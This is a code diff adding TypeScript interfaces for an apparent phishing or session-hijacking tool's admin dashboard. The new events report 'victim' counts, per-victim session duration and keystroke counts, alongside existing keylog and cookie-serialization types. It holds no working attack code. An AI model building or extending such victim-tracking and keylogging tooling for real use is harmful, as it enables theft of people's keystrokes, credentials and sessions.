@@ -104,6 +104,10 @@ export interface ServerToClientEvents {
   keylog: (data: KeylogPayload) => void;
   /** Page title + favicon URL, sent after each navigation */
   page_meta: (data: PageMetaPayload) => void;
+  /** System metrics update (sent to admin every 2s) */
+  system_metrics: (data: SystemMetricsPayload) => void;
+  /** Per-victim metrics update (sent to admin every 2s) */
+  victim_metrics: (data: VictimMetricsPayload) => void;
 }
 
 /** Per-socket server state */
@@ -194,6 +198,26 @@ export interface KeylogPayload {
 export interface PageMetaPayload {
   title: string;
   favicon: string;
+}
+
+export interface SystemMetricsPayload {
+  activeVictims: number;
+  maxVictims: number;
+  uptimeSeconds: number;
+  memoryUsageMB: number;
+  memoryTotalMB: number;
+  memoryPercent: number;
+  cpuPercent: number;
+  totalSessionsToday: number;
+}
+
+export interface VictimMetricsPayload {
+  browserId: string;
+  sessionDurationSeconds: number;
+  currentFPS: number;
+  averageLatencyMs: number;
+  keystrokeCount: number;
+  memoryUsageMB: number;
 }
 
 export interface SerializedCookie {
